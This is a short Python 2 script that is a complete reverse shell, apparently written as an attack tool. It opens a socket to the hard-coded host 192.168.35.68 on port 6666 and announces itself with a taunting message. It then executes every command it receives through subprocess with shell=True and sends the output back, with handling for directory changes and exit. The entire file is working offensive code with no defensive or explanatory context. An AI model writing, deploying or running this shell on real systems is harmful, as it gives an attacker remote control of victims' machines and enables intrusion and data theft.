#!/usr/bin/python
#coding: utf-8

import socket,sys,subprocess,os									#module import

#Initatiating connection
def init():
	remote_host = '192.168.35.68'								#parameters
	port = 6666
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Creation du socket
	s.connect((remote_host, port))								#connection to remote host
	return s													#keeping s variable

#host interaction session
def shell(s):
	s.sendall("I\'m here !\nStart the massacre (╯°□°）╯︵ ┻━┻\n")
	while True:
		pwd = os.getcwd() + ">"									#getting current dir
		s.sendall(str(pwd))										#sending current dir
		data = s.recv(1024)										#setting data variable with buffer, everything that is sent by server
		data = data.replace('\n','')							#removing new lines
		
		if data == 'exit':										#asking for exit, quitting
			s.close()
			sys.exit(1)
		else:													
			if data[:2] == 'cd':								#asking for change directory		
				data_pwd = str(data[3:].replace(' ', ''))		#creating string variable with path
				if os.path.exists(data_pwd) == True :			#if the directory actually exists
					os.chdir(data_pwd)							#change directory
			else:												#else, is not exit or change, execute the command
				p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout_value = p.stdout.read() + p.stderr.read()#populating output variable
				s.sendall(stdout_value)							#sending the output

def main():
	shell(init())												#function inception

main()
